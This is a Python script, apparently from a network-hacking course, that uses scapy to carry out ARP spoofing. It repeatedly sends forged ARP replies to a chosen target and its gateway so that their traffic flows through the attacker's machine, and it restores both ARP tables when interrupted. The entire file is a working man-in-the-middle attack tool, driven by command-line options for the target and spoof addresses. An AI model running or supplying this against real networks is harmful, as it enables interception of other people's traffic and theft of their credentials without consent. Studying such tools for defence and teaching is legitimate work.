# This will make all the target requests and responses pass through your system (Router to person)

import time
import scapy.all as scapy
import optparse


def get_input():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Enter the target ip to spoof")
    parser.add_option("-s", "--spoof", dest="gateway_ip", help="Enter the spoof ip")
    (options, agruments) = parser.parse_args()

    if not options.target_ip:
        print("Enter the target ip or --help")
    elif not options.gateway_ip:
        print("Enter the spoof ip or --help")

    return options


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #An arp packet is created with some details op field 2 (to get Arp response), target IP (destination IP), target MAC (destinagtion MAC), router IP and to saay that I am the router
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    #An arp packet is created with some details op field 2 (to get Arp response), target IP (destination IP), target MAC (destinagtion MAC), router IP, rouetr mac to restore and say that I aam target the router is at this given mac
    scapy.send(packet, verbose=False, count=4)


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    mac_broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_mac_broadcast = mac_broadcast/arp_request
    answered_list = scapy.srp(arp_request_mac_broadcast, timeout=1, verbose=False)[0]

    for element in answered_list:
        return element[1].hwsrc



ip = get_input()

sent_packet_count = 0

try:
    while True:
        sent_packet_count = sent_packet_count + 2
        spoof(ip.target_ip, ip.gateway_ip)
        spoof(ip.gateway_ip, ip.target_ip)
        print("\r[+] Packet sent ", sent_packet_count, end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("\n")
    print("[-] Ctrl+C .... Programe stoped")
    restore(ip.target_ip, ip.gateway_ip)
    restore(ip.gateway_ip, ip.target_ip)
    print("[-] Reseting ARP table")